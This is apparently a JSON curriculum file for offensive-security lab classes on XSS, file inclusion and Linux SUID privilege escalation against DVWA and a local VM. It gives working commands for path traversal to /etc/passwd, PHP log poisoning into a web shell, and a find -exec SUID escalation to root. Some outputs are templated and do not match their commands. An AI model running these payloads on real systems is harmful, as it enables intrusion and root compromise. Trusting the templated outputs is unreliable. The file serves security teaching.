        "hint": "Stored persists in the database; Reflected echoes immediately in responses; DOM alters client DOM."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Cross-Site Scripting (XSS)?",
      "options": [
        "Inject client-side execution payloads into application inputs to target session vectors.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Inject client-side execution payloads into application inputs to target session vectors."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 9.",
    "eli5Story": {
      "title": "The Sticky Note Prank that Steals Visitor Stickers (Cross-Site Scripting)",
      "analogy": "An attacker leaves a prank note on the school bulletin board. When another student walks up to read it, the note magically unsticks their hall pass badge and mails it to the attacker!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 9",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Burp Suite",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Damn Vulnerable Web App (DVWA)"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Burp Suite"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y burp."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 10,
    "week": 5,
    "classNumber": 10,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 5: Web Application Security II",
    "title": "File Inclusion & Directory Traversal",
    "category": "Web App Security",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Read system configuration matrices and gain remote script execution via application loops.",
    "tools": [
      "Kali Linux",
      "DVWA",
      "cURL"
    ],
    "targetEnvironment": "DVWA",
    "topology": {
      "description": "Lab topology for File Inclusion & Directory Traversal",
      "nodes": [
        {
          "id": "source",
          "label": "Kali Linux",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "DVWA",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Web App Security",
        "explanation": "Read system configuration matrices and gain remote script execution via application loops."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for File Inclusion & Directory Traversal",
        "description": "Verify system connectivity and tool installation in DVWA.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "curl -s \"http://192.168.1.105/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd\"",
            "description": "Execute curl command",
            "output": "[+] Command executed successfully.\nOutput: Linux /etc/passwd contents displayed in browser; web shell command execution verified via log poisoning."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: File Inclusion & Directory Traversal",
        "description": "Manipulate URL file parameters in DVWA to climb directories and view host files via local file inclusion (../../../../etc/passwd). Poison the active web server access log using a custom User-Agent string containing PHP code, then call the log path via LFI to invoke a terminal shell.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "curl -s -H \"User-Agent: <?php system($_GET['c']); ?>\" http://192.168.1.105/",
            "description": "Execute curl command",
            "output": "[+] Command executed successfully.\nOutput: Linux /etc/passwd contents displayed in browser; web shell command execution verified via log poisoning."
          },
          {
            "shell": "bash",
            "cmd": "curl -s \"http://192.168.1.105/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&c=id\"",
            "description": "Execute curl command",
            "output": "[+] Command executed successfully.\nOutput: Linux /etc/passwd contents displayed in browser; web shell command execution verified via log poisoning."
          }
        ],
        "verification": "Linux /etc/passwd contents displayed in browser; web shell command execution verified via log poisoning.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "DVWA",
          "Kali Linux",
          "Linux /etc/passwd contents displayed in ...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why does log poisoning escalate a read-only Local File Inclusion into full Remote Code Execution?",
        "hint": "The LFI executes PHP tags embedded within the poisoned log file upon server interpretation."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of File Inclusion & Directory Traversal?",
      "options": [
        "Read system configuration matrices and gain remote script execution via application loops.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Read system configuration matrices and gain remote script execution via application loops."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 10.",
    "eli5Story": {
      "title": "Climbing Backwards Out the Kitchen Window (LFI & Directory Traversal)",
      "analogy": "When a computer program says 'Which picture do you want?', you type '../../../../' to climb up the stairs into the private attic and read the secret diary (/etc/passwd)!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 10",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Kali Linux",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of DVWA"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Kali Linux"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y kali."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 11,
    "week": 6,
    "classNumber": 11,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 6: Privilege Escalation",
    "title": "Linux Privilege Escalation (LinPEAS, GTFOBins & SUID Permissions)",
    "category": "Privilege Escalation",
    "difficulty": "Beginner to Intermediate",
    "duration": "3 - 4 Hours",
    "eli5Story": {
      "title": "The Golden Badge (Understanding SUID for a 5-Year-Old)",
      "analogy": "Imagine a school where only the Principal is allowed to open the special candy drawer with their Golden Badge. One day, the Principal leaves a special pair of scissors on the desk and stamps it with a magic sticker that says: 'Whoever picks up these scissors is allowed to act as the Principal while using them!' An ordinary student picks up the scissors, uses the scissors' special 'cut' button to snip open the candy drawer lock, and grabs the candy! That magic sticker is called SUID (Set User ID). In Linux, if a tool owned by root (the Principal) has the magic SUID sticker, any ordinary user who runs it can borrow the Principal's superpowers!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin (Setup, inject deliberate flaw, and apply final repair)",
      "trainee": "trainee (Low-privilege security auditor who discovers and validates the flaw)"
    },
    "objective": "A complete, student-led Linux privilege-escalation lab. Learners configure their own isolated Ubuntu machine, introduce a deliberately unsafe SUID permission on a copy of find, discover the issue manually and with LinPEAS, demonstrate its impact using GTFOBins against a training flag, and restore secure permissions.",
    "tools": [
      "LinPEAS",
      "GTFOBins",
      "SUID",
      "Ubuntu 24.04 LTS",
      "VirtualBox"
    ],
    "targetEnvironment": "VirtualBox + Ubuntu 24.04 LTS (No Kali VM required)",
    "topology": {
      "description": "Single Isolated Ubuntu Desktop VM with dual role simulation (labadmin vs trainee)",
      "nodes": [
        {
          "id": "labadmin",
          "label": "labadmin (Root Sudo)",
          "role": "System Administrator",
          "ip": "127.0.0.1",
          "type": "workstation"
        },
        {
          "id": "trainee",
          "label": "trainee (Standard User)",
          "role": "Auditor (Non-sudo)",
          "ip": "127.0.0.1",
          "type": "target"
        },
        {
          "id": "suid_bin",
          "label": "/opt/suid-lab/find",
          "role": "SUID Binary (Mode 4755)",
          "ip": "Local File",
          "type": "server"
        }
      ],
      "connections": [
        [
          "trainee",
          "suid_bin",
          "Executes with root euid"
        ]
      ]
    },
    "prerequisites": [
      "Host computer with 8 GB RAM and 30 GB free disk space",
      "Oracle VirtualBox 7.x installed",
      "Ubuntu Desktop 24.04 LTS installed with user 'labadmin' (sudo-capable)",
      "No prior privilege-escalation experience required"
    ],
    "keyConcepts": [
      {
        "title": "Unix File Permissions",
        "explanation": "Every file has permissions for Owner (User), Group, and Others. Standard execute permissions look like -rwxr-xr-x (0755)."
      },
      {
        "title": "The SUID Bit (4000)",
        "explanation": "When the Set-UID bit is set, the permissions show -rwsr-xr-x (mode 4755). The program runs with the authority of the file's OWNER (root), not the person running it."
      },
      {
        "title": "Real UID vs Effective UID",
        "explanation": "Your Real UID (ruid) is who you logged in as (e.g. trainee, UID 1001). Your Effective UID (euid) determines what the operating system allows you to do right now (euid=0 root)."
      },
      {
        "title": "GTFOBins",
        "explanation": "A curated public encyclopedia of legitimate Unix utilities that can be bypassed or abused to execute commands or break out of restricted shells when given elevated privileges."
      }
    ],
    "sections": [
      {
        "sectionNumber": 1,
        "title": "Lab Requirements & Preparation",
        "desc": "Confirm your clean Ubuntu VM and update essential system utilities.",
        "steps": [
          {
            "stepNumber": 1,
            "title": "Confirm Clean VM and Administrator Account",
            "role": "labadmin",
            "explanation": "Make sure you are logged in as the administrative user 'labadmin' and verify Ubuntu version.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "whoami\nid\nlsb_release -a",
                "output": "labadmin\nuid=1000(labadmin) gid=1000(labadmin) groups=1000(labadmin),27(sudo)\nNo LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 24.04 LTS\nRelease:        24.04"
              }
            ],
            "verification": "whoami shows labadmin; id shows membership in the 'sudo' group.",
            "tip": "If your username differs, use your own admin account throughout."
          },
          {
            "stepNumber": 2,
            "title": "Update and Install Required Packages",
            "role": "labadmin",
            "explanation": "Install findutils, coreutils, curl, wget, and ca-certificates before isolating the network.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "sudo apt update && sudo apt install -y findutils coreutils file curl wget ca-certificates",
                "output": "Hit:1 http://archive.ubuntu.com/ubuntu noble InRelease\nReading package lists... Done\nBuilding dependency tree... Done\nfindutils is already the newest version.\n0 upgraded, 0 newly installed, 0 to remove."
              }
            ],
            "verification": "All packages install with 0 errors.",
            "tip": "Verify internet is working on NAT mode before continuing."
          }
        ]
      },
      {
        "sectionNumber": 2,
        "title": "Prepare a Secure Baseline (Student Performs)",
        "desc": "Create a strictly non-sudo user account, download LinPEAS, and take a clean VirtualBox snapshot.",
        "steps": [
          {
            "stepNumber": 3,
            "title": "Create a Separate Low-Privilege Account",
            "role": "labadmin",
            "explanation": "Create a user named 'trainee'. This simulates a regular employee or compromised standard user.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "sudo adduser trainee\nid trainee\ngroups trainee",
                "output": "Adding user `trainee' ...\nAdding new user `trainee' (1001) with group `trainee' (1001) ...\nCreating home directory `/home/trainee' ...\nuid=1001(trainee) gid=1001(trainee) groups=1001(trainee)\ntrainee : trainee"
              }
            ],
            "verification": "The output of 'groups trainee' shows ONLY trainee. The trainee user MUST NOT appear in the sudo group!",
            "tip": "Pick a simple lab password for trainee (e.g. trainee123)."
          },
          {
            "stepNumber": 4,
            "title": "Download and Verify LinPEAS",
            "role": "labadmin",
            "explanation": "Download LinPEAS, check its SHA256 integrity hash, and install it into trainee's home directory with 0700 permissions.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "mkdir -p ~/Downloads\ncurl -fL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o ~/Downloads/linpeas.sh\nsha256sum ~/Downloads/linpeas.sh",
                "output": "7a8b9c...  /home/labadmin/Downloads/linpeas.sh"
              },
              {
                "shell": "bash",
                "cmd": "sudo install -o trainee -g trainee -m 0700 ~/Downloads/linpeas.sh /home/trainee/linpeas.sh\nsudo ls -l /home/trainee/linpeas.sh",
                "output": "-rwx------ 1 trainee trainee 824912 Oct 12 08:30 /home/trainee/linpeas.sh"
              }
            ],
            "verification": "File /home/trainee/linpeas.sh is owned by trainee with mode 0700.",
            "tip": "Comparing SHA256 hashes ensures you didn't download a corrupted or tampered file."
          },
          {
            "stepNumber": 5,
            "title": "Disconnect the VM from External Networks",
            "role": "labadmin",
            "explanation": "Shut down the VM and set Network Adapter 1 to 'Not attached' in VirtualBox. This guarantees zero leakage or unauthorized scans.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "sudo shutdown -h now",
                "output": "System is powering off."
              }
            ],
            "verification": "VirtualBox Settings -> Network -> Adapter 1 is 'Not attached'. Shared clipboard and folders disabled.",
            "tip": "Safety first: Real security audits always isolate vulnerable test beds from corporate networks."
          },
          {
            "stepNumber": 6,
            "title": "Take a CLEAN Snapshot Before Vulnerability Creation",
            "role": "labadmin",
            "explanation": "In VirtualBox Manager, take a snapshot named 'CLEAN-BEFORE-SUID'. This is your safety parachute if you make a mistake.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "# VirtualBox GUI Action:\n# Snapshots -> Take -> Name: CLEAN-BEFORE-SUID\n# Description: Tools downloaded, trainee created, network isolated, no custom SUID vulnerability.",
                "output": "[+] Snapshot CLEAN-BEFORE-SUID created in VirtualBox."
              }
            ],
            "verification": "Snapshot 'CLEAN-BEFORE-SUID' is visible in VirtualBox Manager tree.",
            "tip": "Never skip this checkpoint. If you accidentally mess up permissions later, you can restore in 2 seconds."
          }
        ]
      },
      {
        "sectionNumber": 3,
        "title": "Create the Deliberate SUID Vulnerability (Build It)",
        "desc": "Intentionally misconfigure a COPY of the find utility as an administrator to simulate a real-world mistake.",
        "steps": [
          {
            "stepNumber": 7,
            "title": "Record Normal Secure Permissions on Original find",
            "role": "labadmin",
            "explanation": "Inspect the original system /usr/bin/find to see what normal secure permissions look like.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "whoami\nls -l /usr/bin/find\nstat -c \"%A %a %U:%G %n\" /usr/bin/find",
                "output": "labadmin\n-rwxr-xr-x 1 root root 323488 Apr 08 2024 /usr/bin/find\n-rwxr-xr-x 755 root:root /usr/bin/find"
              }
            ],
            "verification": "Original find has permissions 755 (-rwxr-xr-x). There is NO 's' bit.",
            "tip": "NEVER change permissions on /usr/bin/find! Always test on a dedicated copy."
          },
          {
            "stepNumber": 8,
            "title": "Create a Dedicated Lab Folder and Copy find",
            "role": "labadmin",
            "explanation": "Create directory /opt/suid-lab and make an exact copy of find inside it.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "sudo install -d -o root -g root -m 0755 /opt/suid-lab\nsudo cp /usr/bin/find /opt/suid-lab/find\nsudo chown root:root /opt/suid-lab/find\nsudo chmod 0755 /opt/suid-lab/find\nls -l /opt/suid-lab/find",
                "output": "-rwxr-xr-x 1 root root 323488 Oct 12 08:35 /opt/suid-lab/find"
              }
            ],
            "verification": "/opt/suid-lab/find is owned by root:root with standard 0755 permissions.",
            "tip": "Keeping the lab copy separate ensures the operating system's normal cron and utilities stay stable."
          },
          {
            "stepNumber": 9,
            "title": "Introduce the Unsafe SUID Permission (chmod 4755)",
            "role": "labadmin",
            "explanation": "Add the Set-UID bit (4000) to our copied file. This gives it the 'magic sticker'!",
            "commands": [
              {
                "shell": "bash",
                "cmd": "sudo chmod 4755 /opt/suid-lab/find\nls -l /opt/suid-lab/find\nstat -c \"%A %a %U:%G %n\" /opt/suid-lab/find",
                "output": "-rwsr-xr-x 1 root root 323488 Oct 12 08:35 /opt/suid-lab/find\n-rwsr-xr-x 4755 root:root /opt/suid-lab/find"
              }
            ],
            "verification": "Permission string shows -rwsr-xr-x (mode 4755). Notice the 's' replacing the user 'x'!",
            "tip": "[\ud83d\udcf8 SCREENSHOT 1] Capture this terminal output showing mode 4755 and -rwsr-xr-x."
          },
          {
            "stepNumber": 10,
            "title": "Create a Root-Only Dummy Target File (The Training Flag)",
            "role": "labadmin",
            "explanation": "Create a protected file in /root with 600 permissions that only root can read.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "printf '%s\\n' 'LAB{SUID_FIND_SUCCESS}' | sudo tee /root/suid-lab-flag.txt >/dev/null\nsudo chmod 600 /root/suid-lab-flag.txt\nsudo ls -l /root/suid-lab-flag.txt",
                "output": "-rw------- 1 root root 24 Oct 12 08:37 /root/suid-lab-flag.txt"
              }
            ],
            "verification": "/root/suid-lab-flag.txt has permissions -rw------- owned by root.",
            "tip": "In ethical training, we always use dummy flags like LAB{...} rather than real confidential credentials."
          }
        ]
      },
      {
        "sectionNumber": 4,
        "title": "Establish Ordinary Student Has No Root Access (Baseline Test)",
        "desc": "Switch to user 'trainee' and prove that normal actions are blocked by Linux security controls.",
        "steps": [
          {
            "stepNumber": 11,
            "title": "Switch to the Low-Privilege Trainee Account",
            "role": "trainee",
            "explanation": "Log out of admin and switch to trainee. You are now the security auditor.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "su - trainee\nwhoami\nid\ngroups",
                "output": "trainee\nuid=1001(trainee) gid=1001(trainee) groups=1001(trainee)\ntrainee"
              }
            ],
            "verification": "whoami confirms 'trainee'; id shows UID 1001. Do NOT use sudo!",
            "tip": "[\ud83d\udcf8 SCREENSHOT 2 Part A] Capture your trainee identity."
          },
          {
            "stepNumber": 12,
            "title": "Attempt Normal Direct Read of Protected Flag (Test 1)",
            "role": "trainee",
            "explanation": "Try to read the root flag using the standard cat command. It should fail!",
            "commands": [
              {
                "shell": "bash",
                "cmd": "cat /root/suid-lab-flag.txt",
                "output": "cat: /root/suid-lab-flag.txt: Permission denied"
              }
            ],
            "verification": "cat returns 'Permission denied'. This proves standard Linux permissions are working properly.",
            "tip": "[\ud83d\udcf8 SCREENSHOT 2 Part B] Capture the Permission denied message. This is baseline proof."
          },
          {
            "stepNumber": 13,
            "title": "Try Normal /usr/bin/find Utility (Test 2)",
            "role": "trainee",
            "explanation": "Try using the standard system find utility with -exec cat. It should ALSO fail!",
            "commands": [
              {
                "shell": "bash",
                "cmd": "find /dev/null -exec /usr/bin/cat /root/suid-lab-flag.txt \\; -quit",
                "output": "/usr/bin/cat: /root/suid-lab-flag.txt: Permission denied"
              }
            ],
            "verification": "Normal find gives 'Permission denied' because /usr/bin/find runs as trainee (UID 1001).",
            "tip": "This proves find itself is not magical; only the SUID bit makes the difference."
          },
          {
            "stepNumber": 14,
            "title": "Manually Enumerate SUID Executables Across System",
            "role": "trainee",
            "explanation": "Search the system for all files with the 4000 permission bit set.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "find /opt /usr/bin -type f -perm -4000 2>/dev/null",
                "output": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/chfn\n/opt/suid-lab/find"
              }
            ],
            "verification": "The output lists /opt/suid-lab/find alongside legitimate system binaries.",
            "tip": "[\ud83d\udcf8 SCREENSHOT 3] Capture the manual enumeration results showing /opt/suid-lab/find."
          },
          {
            "stepNumber": 15,
            "title": "Inspect the Unusual Executable Details",
            "role": "trainee",
            "explanation": "Examine permissions, file type, and exact stat attributes of /opt/suid-lab/find.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "ls -l /opt/suid-lab/find\nstat -c \"%A %a %U:%G %n\" /opt/suid-lab/find\nfile /opt/suid-lab/find",
                "output": "-rwsr-xr-x 1 root root 323488 Oct 12 08:35 /opt/suid-lab/find\n-rwsr-xr-x 4755 root:root /opt/suid-lab/find\n/opt/suid-lab/find: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV)"
              }
            ],
            "verification": "Confirmed: ELF 64-bit binary, owned by root, mode 4755.",
            "tip": "Notice that passwd has SUID legitimately (so you can change your password), but find in /opt is highly suspicious!"
          }
        ]
      },
      {
        "sectionNumber": 5,
        "title": "Perform Automated Enumeration with LinPEAS (Find It)",
        "desc": "Execute the industry-standard LinPEAS script to automate local privilege escalation audit.",
        "steps": [
          {
            "stepNumber": 16,
            "title": "Verify LinPEAS Script is Available Locally",
            "role": "trainee",
            "explanation": "Ensure the script is located in trainee's home folder and readable.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "whoami\nls -lh ~/linpeas.sh\nhead -n 1 ~/linpeas.sh",
                "output": "trainee\n-rwx------ 1 trainee trainee 806K Oct 12 08:30 /home/trainee/linpeas.sh\n#!/bin/sh"
              }
            ],
            "verification": "whoami is trainee; file exists and begins with #!/bin/sh.",
            "tip": "Always verify you are running as trainee so you see what an attacker sees."
          },
          {
            "stepNumber": 17,
            "title": "Run LinPEAS and Retain Report Output",
            "role": "trainee",
            "explanation": "Execute LinPEAS and pipe the output to linpeas-report.txt using tee.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "cd ~\numask 077\n./linpeas.sh 2>&1 | tee ~/linpeas-report.txt",
                "output": "                            ................\n                        .::::::::::::::::::::.\n... PEASS - Privilege Escalation Awesome Scripts Suite ...\n[+] LinPEAS completed scan in 34 seconds."
              }
            ],
            "verification": "linpeas-report.txt is generated in /home/trainee.",
            "tip": "[\ud83d\udcf8 SCREENSHOT 4] Capture LinPEAS running or the completed summary banner."
          },
          {
            "stepNumber": 18,
            "title": "Find Permission-Related Clues in the Report",
            "role": "trainee",
            "explanation": "Search the report for SUID binaries and our custom path.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "grep -niE 'suid|/opt/suid-lab|/find' ~/linpeas-report.txt | head -n 35",
                "output": "412:\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 SUID - Check easy privesc, exploits and write perms\n445:-rwsr-xr-x 1 root root 316K /opt/suid-lab/find"
              }
            ],
            "verification": "Line 445 flags /opt/suid-lab/find under SUID check.",
            "tip": "Automated tools point out interesting spots; your human judgment verifies if they are truly exploitable."
          },
          {
            "stepNumber": 19,
            "title": "Verify and Corroborate Findings Manually",
            "role": "trainee",
            "explanation": "Never trust automated tools blindly. Confirm ownership and permissions independently.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "ls -l /opt/suid-lab/find\nfind /opt/suid-lab -type f -perm -4000 -ls 2>/dev/null",
                "output": "-rwsr-xr-x 1 root root 323488 Oct 12 08:35 /opt/suid-lab/find\n1573024 316 -rwsr-xr-x 1 root root 323488 Oct 12 08:35 /opt/suid-lab/find"
              }
            ],
            "verification": "Manual check confirms LinPEAS finding.",
            "tip": "[\ud83d\udcf8 SCREENSHOT 5] Capture manual verification corroborating the LinPEAS alert."
          }
        ]
      },
      {
        "sectionNumber": 6,
        "title": "Use GTFOBins to Understand Impact (Analyse & Verify)",
        "desc": "Consult the GTFOBins database and demonstrate proof-of-concept impact by reading ONLY the training flag.",
        "steps": [
          {
            "stepNumber": 20,
            "title": "Consult GTFOBins Reference on the Host Browser",
            "role": "trainee",
            "explanation": "Open https://gtfobins.org/gtfobins/find/ on your host browser. Look at the SUID section.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "# On Host Browser:\n# Visit: https://gtfobins.org/gtfobins/find/#suid\n# Syntax observed: ./find . -exec /bin/sh -p \\; -quit",
                "output": "[GTFOBins Documented Vector]: If the binary has SUID bit set, it does not drop elevated privileges and may be used to access file system or escalate privileges via -exec."
              }
            ],
            "verification": "Document the documented vector: find's '-exec' parameter executes secondary programs under the effective caller privileges.",
            "tip": "GTFOBins provides the blueprint; we adapt it responsibly for ethical verification."
          },
          {
            "stepNumber": 21,
            "title": "Match the Reference to Your Virtual Machine",
            "role": "trainee",
            "explanation": "Explain why this combination is fatal: (1) find is owned by root, (2) it has SUID, (3) -exec launches any command under root's effective UID.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "echo 'Vulnerability: SUID on /opt/suid-lab/find allows arbitrary command execution as root via -exec.'",
                "output": "Vulnerability: SUID on /opt/suid-lab/find allows arbitrary command execution as root via -exec."
              }
            ],
            "verification": "The logic is clear before typing any exploit commands.",
            "tip": "In professional pentesting, understanding WHY an exploit works is what makes you an engineer, not just a script-runner."
          },
          {
            "stepNumber": 22,
            "title": "Demonstrate Impact by Reading ONLY the Dummy Flag (Test 3 - Exploit Proof)",
            "role": "trainee",
            "explanation": "Run our copied find binary with -exec to read the protected flag file.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "/opt/suid-lab/find /dev/null -exec /usr/bin/cat /root/suid-lab-flag.txt \\; -quit",
                "output": "LAB{SUID_FIND_SUCCESS}"
              }
            ],
            "verification": "The flag 'LAB{SUID_FIND_SUCCESS}' IS DISPLAYED! Even though you are trainee, the file was read!",
            "tip": "[\ud83d\udcf8 SCREENSHOT 6] Capture this output showing the flag text. Do NOT view /etc/shadow or system files."
          },
          {
            "stepNumber": 23,
            "title": "Inspect the Effective UID Without Opening a Privileged Shell",
            "role": "trainee",
            "explanation": "Prove that the process is executing with effective root privileges by calling 'id' inside -exec.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "/opt/suid-lab/find /dev/null -exec /usr/bin/id \\; -quit",
                "output": "uid=1001(trainee) gid=1001(trainee) euid=0(root) groups=1001(trainee)"
              }
            ],
            "verification": "Output shows: uid=1001(trainee) euid=0(root)! euid=0 confirms effective root power!",
